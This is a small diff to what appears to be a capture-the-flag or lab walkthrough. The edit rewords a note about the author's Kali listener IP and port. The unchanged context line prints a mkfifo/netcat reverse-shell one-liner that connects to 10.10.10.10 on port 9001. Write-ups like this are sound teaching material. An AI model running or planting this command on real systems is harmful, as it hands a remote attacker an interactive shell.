@@ -775,7 +775,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
 ```
 
 ***note***
-here i just my ip in which nc is live at port 4561.
+here i used my kali ip in which nc is live at port 4561.
 once after this you get the shell access 
 
 ---
